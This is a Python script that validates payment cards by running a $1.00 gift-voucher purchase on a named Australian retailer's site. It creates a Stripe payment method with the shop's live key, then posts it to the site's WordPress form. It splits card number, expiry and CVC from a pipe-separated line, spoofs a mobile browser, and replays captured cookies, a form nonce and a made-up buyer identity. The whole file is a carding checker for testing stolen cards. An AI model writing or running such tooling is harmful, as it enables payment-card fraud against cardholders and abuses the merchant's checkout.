import requests

def Tele(ccx):
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    # Adjust `yy` to ensure it contains only two digits
    if "20" in yy:
        yy = yy.split("20")[1]

    r = requests.session()

    # Define headers for the first request
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    # Properly format the data string
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=9e6dead0-a2ec-4e39-807f-56858c09cdb0563da1&muid=d68d0eaa-827f-48b5-ba43-cc54815313030861ca&sid=a45604a9-5f67-4e6f-a2ac-ded94cec5f3c0833b0&payment_user_agent=stripe.js%2Fb2d52e5892%3B+stripe-js-v3%2Fb2d52e5892%3B+card-element&referrer=https%3A%2F%2Fshirazrepublic.com.au&time_on_page=55119&key=pk_live_51GZU1qGnAAExcB98j2cbyVELdkTEwbwAeNiwWvLeu3xxPAoKESXWlwafutP1k95x47GGShXCzdUWf9nzR9fOtZJi00Fau7cVww'

    r1 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    pm = r1.json().get('id')

    if not pm:
        return {"error": "Failed to retrieve payment method ID"}

    # Define cookies, headers, and data for the second request
    cookies = {
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2024-11-03%2021%3A11%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fshirazrepublic.com.au%2Fgift-voucher%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_first_add': 'fd%3D2024-11-03%2021%3A11%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fshirazrepublic.com.au%2Fgift-voucher%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
        '_gcl_au': '1.1.1784850561.1730666486',
        '_ga': 'GA1.1.1192491123.1730666487',
        '_ga_Y9FJMYBDWM': 'GS1.1.1730666486.1.1.1730666575.0.0.0',
        'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshirazrepublic.com.au%2Fgift-voucher%2F',
        '__stripe_mid': 'd68d0eaa-827f-48b5-ba43-cc54815313030861ca',
        '__stripe_sid': 'a45604a9-5f67-4e6f-a2ac-ded94cec5f3c0833b0',
    }

    headers = {
        'authority': 'shirazrepublic.com.au',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://shirazrepublic.com.au',
        'referer': 'https://shirazrepublic.com.au/gift-voucher/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        't': '1730666657106',
    }

    data = {
        'data': f'__fluent_form_embded_post_id=13034&_fluentform_8_fluentformnonce=4d34634a8f&_wp_http_referer=%2Fgift-voucher%2F&names%5Bfirst_name%5D=waznim&names%5Blast_name%5D=ey&email=waznimey%40gmail.com&phone=&voucher_value=Custom%20Amount&custom-payment-amount=1.00&input_text=waznim%20ey%20ey&payment_method=stripe&__stripe_payment_method_id={pm}',
        'action': 'fluentform_submit',
        'form_id': '8',
    }

    r2 = r.post(
        'https://shirazrepublic.com.au/wp-admin/admin-ajax.php',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
    
    return r2.json()
